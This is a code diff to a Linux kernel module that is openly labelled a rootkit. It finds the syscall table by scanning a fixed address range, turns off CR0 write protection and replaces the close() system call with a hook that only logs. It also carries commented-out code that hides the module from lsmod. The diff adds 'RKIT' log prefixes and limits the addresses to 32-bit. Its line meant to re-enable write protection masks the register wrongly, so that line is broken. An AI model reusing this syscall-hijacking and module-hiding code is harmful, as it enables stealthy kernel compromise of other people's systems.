@@ -4,23 +4,24 @@
 #include <linux/syscalls.h>
 #include <asm/unistd.h>
 
-#if defined(__386__)
-#define SYSCALL_TABLE_START 0xc0000000
-#define SYSCALL_TABLE_STOP 0xd0000000
+//#if defined(__686__)
+#define SYSCALL_TABLE_START ((unsigned long) 0xc0000000)
+#define SYSCALL_TABLE_STOP ((unsigned long) 0xd0000000)
 typedef unsigned int pointer_size_t;
-#else
-#define SYSCALL_TABLE_START (unsigned long)0xffffffff81000000l
-#define SYSCALL_TABLE_STOP (unsigned long)0xffffffffa2000000l
-typedef unsigned long pointer_size_t;
-#endif
+unsigned int **syscall_table;
+//#else
+//#define SYSCALL_TABLE_START ((unsigned long) 0xffffffff81000000l)
+//#define SYSCALL_TABLE_STOP ((unsigned long) 0xffffffffa2000000l)
+//typedef unsigned long pointer_size_t;
+//unsigned long **syscall_table;
+//#endif
 
-unsigned long **syscall_table;
 asmlinkage int (*original_close)(int fd);
 
 asmlinkage int my_close(int fd)
 {
     int err;
-    printk("Hijacked close call; fd: %d\n", fd);
+    printk("RKIT: Hijacked close call; fd: %d\n", fd);
     err = original_close(fd);
     return err;
 }
@@ -39,13 +40,12 @@ pointer_size_t **find_syscall_table(void)
 
 int rootkit_init(void)
 {
-    printk("Rootkit loaded\n");
+    printk("RKIT: Loading rootkit...\n");
 
     /* Uncomment the following lines after completion of module
      * Can't rmmod it if we have it uncommented during dev
      * That's just cumbersome during dev
      */
-
     /*
     // stop from showing on lsmod
     list_del_init(&__this_module.list);
@@ -59,16 +59,18 @@ int rootkit_init(void)
         goto out;
     }
 
-    printk("Syscall table at %p\n", syscall_table);
-
+    printk("RKIT: Syscall table at %p\n", syscall_table);
+    printk("RKIT: Disabling write protection\n");
     // make writable by disabling write protect
     write_cr0(read_cr0() & (~0x10000));
 
     // hijack chdir system call
     original_close = (asmlinkage int (*)(int)) syscall_table[__NR_close];
     syscall_table[__NR_close] = (void *) my_close;
+    printk("RKIT: Calls hijacked\n");
 
     // enable write protected
+    printk("RKIT: Re-enabling write protection\n");
     write_cr0(read_cr0() & 0x10000);
 
 out:
@@ -77,10 +79,13 @@ out:
 
 void rootkit_exit(void)
 {
+    // Disable write protection on page
     write_cr0(read_cr0() & (~0x10000));
     syscall_table[__NR_close] = (void *) original_close;
+    // Enable write protection on page
     write_cr0(read_cr0() & 0x10000);
-    printk("Rootkit unloaded\n");
+    printk("RKIT: Rootkit unloaded\n");
+    return;
 }
 
 MODULE_LICENSE("GPL");
